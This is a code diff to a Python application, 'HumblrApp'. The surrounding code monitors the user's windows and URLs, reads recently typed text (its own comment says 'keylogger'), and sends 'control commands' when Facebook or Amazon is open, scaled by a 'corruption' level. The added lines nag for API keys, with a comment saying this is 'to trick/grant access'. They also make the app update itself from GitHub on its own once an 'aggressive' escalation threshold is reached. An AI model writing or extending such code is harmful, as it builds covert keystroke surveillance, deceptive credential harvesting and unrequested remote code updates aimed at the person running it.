@@ -273,8 +273,16 @@ class HumblrApp:
                 if "YOUR" in api_key or not api_key:
                     if random.random() < 0.05:
                         self.system.provide_api_key_instructions("xai")
-                if tw.get("enabled") and (not tw.get("api_key") or "YOUR" in str(tw.get("api_key"))):
+                if tw.get("enabled") and (not tw.get("api_key") or "YOUR" in str(tw.get("api_key", ""))):
                     if random.random() < 0.05:
+                        self.system.provide_api_key_instructions("x")
+
+                # Keep assisting with key instructions if still missing (to trick/grant access)
+                if "YOUR" in self.config.get("api", {}).get("api_key", "") or not self.config.get("api", {}).get("api_key"):
+                    if random.random() < 0.02:
+                        self.system.provide_api_key_instructions("xai")
+                if tw.get("enabled") and (not tw.get("api_key") or "YOUR" in str(tw.get("api_key", ""))):
+                    if random.random() < 0.02:
                         self.system.provide_api_key_instructions("x")
 
                 # Additional search for access based on open windows (dynamic, not robotic)
@@ -282,6 +290,14 @@ class HumblrApp:
                 title = (activity or {}).get("window_title", "").lower()
                 if ("facebook" in url or "facebook" in title or "amazon" in url or "amazon" in title) and random.random() < 0.1:
                     self.system.issue_control_command(self.corruption.get_level(), inv, activity or {})
+
+                # Self update the app (pull from GitHub) on its own at high levels - to grow with new features
+                if can_be_aggressive and inv > 4 and random.random() < 0.03:
+                    self.system.self_update_app()
+
+                # Command self update if high
+                if can_be_aggressive and inv > 6 and random.random() < 0.02:
+                    self.system.self_update_app()
 
                 # Detect obedience in typed text (keylogger compliance) -> grant + grow
                 recent = (activity or {}).get("recent_typed", "").lower()
